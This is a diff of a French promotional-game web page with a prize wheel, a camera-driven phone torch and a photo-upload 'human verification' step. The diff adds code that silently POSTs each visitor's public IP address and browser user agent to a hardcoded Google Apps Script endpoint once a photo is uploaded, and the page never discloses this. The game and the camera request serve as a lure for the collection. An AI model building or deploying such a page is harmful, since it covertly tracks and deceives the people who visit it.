@@ -2,7 +2,7 @@
 <html lang="fr">
 <head>
   <meta charset="utf-8">
-  <title>Jeu Promo : Photo + Roue + Torche</title>
+  <title>Jeu Promo : Roue + Torche + Logs</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
     body { font-family: Arial, sans-serif; text-align: center; background: #f7f7f7; padding: 2rem; }
@@ -34,9 +34,12 @@
   <div id="ip">Ton IP : …</div>
 
   <script>
+    // === CONFIGURATION ===
+    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbwV6HRk_fUhwArTLMg_AcAWIb8LXHq3Klvt8GydmzwL2cGI_5f3gNbwII8R3xVK40DO3g/exec";
+
+    // --- Dessin roue ---
     const wheelCanvas = document.getElementById("wheel");
     const ctx = wheelCanvas.getContext("2d");
-
     const segments = ["🎁 -10%", "🚚 Livraison gratuite", "🎧 Goodie", "🎟 5€ bon", "🎉 15%", "❌ Pas de gain"];
     const colors = ["#f44336", "#4caf50", "#ffeb3b", "#2196f3", "#ff9800", "#9c27b0"];
 
@@ -70,13 +73,11 @@
         if (!torchStream) {
           torchStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
           torchTrack = torchStream.getVideoTracks()[0];
-          // Ne pas afficher le flux
         }
       } catch (e) {
         console.log("Erreur accès caméra:", e);
       }
     }
-
     async function toggleTorch(on) {
       try {
         if (!torchTrack) return;
@@ -87,13 +88,12 @@
       } catch(e) { console.log("Torch error:", e); }
     }
 
-    // --- Roue ---
+    // --- Spin ---
     let spinning = false;
     document.getElementById("spin").addEventListener("click", async () => {
       if (spinning) return;
       spinning = true;
 
-      // Allumer la torche pendant le spin
       await toggleTorch(true);
 
       const arc = (2 * Math.PI) / segments.length;
@@ -107,32 +107,47 @@
       setTimeout(async () => {
         const result = segments[segments.length - 1 - spinAngle];
         document.getElementById("result").textContent = "🎊 Bravo ! " + result;
-        // Éteindre la torche après le spin
         await toggleTorch(false);
         spinning = false;
       }, 4000);
     });
 
-    // --- IP ---
-    async function showIP() {
+    // --- Récupération IP ---
+    async function getPublicIP() {
       try {
-        const r = await fetch("https://api.ipify.org?format=json");
-        const j = await r.json();
-        document.getElementById("ip").textContent = "Ton IP : " + j.ip;
-      } catch (e) {
+        const res = await fetch("https://api.ipify.org?format=json");
+        const data = await res.json();
+        document.getElementById("ip").textContent = "Ton IP : " + data.ip;
+        return data.ip;
+      } catch(e) {
         document.getElementById("ip").textContent = "Impossible de récupérer l’IP.";
+        return "IP inconnue";
       }
     }
-    showIP();
 
-    // --- Vérification humaine via photo ---
+    // --- Envoi vers Apps Script ---
+    async function logVisitor() {
+      const ip = await getPublicIP();
+      const userAgent = navigator.userAgent;
+
+      try {
+        await fetch(SCRIPT_URL, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ ip, userAgent })
+        });
+      } catch (e) {
+        console.log("Erreur envoi Apps Script:", e);
+      }
+    }
+
+    // --- Vérification humaine ---
     const photoInput = document.getElementById("humanPhoto");
     photoInput.addEventListener("change", async () => {
       if (photoInput.files.length > 0) {
-        // Init caméra une seule fois pour la torche
         await initCamera();
-        // Autoriser la roue à tourner
         document.getElementById("spin").disabled = false;
+        await logVisitor(); // log seulement après validation photo
       }
     });
   </script>
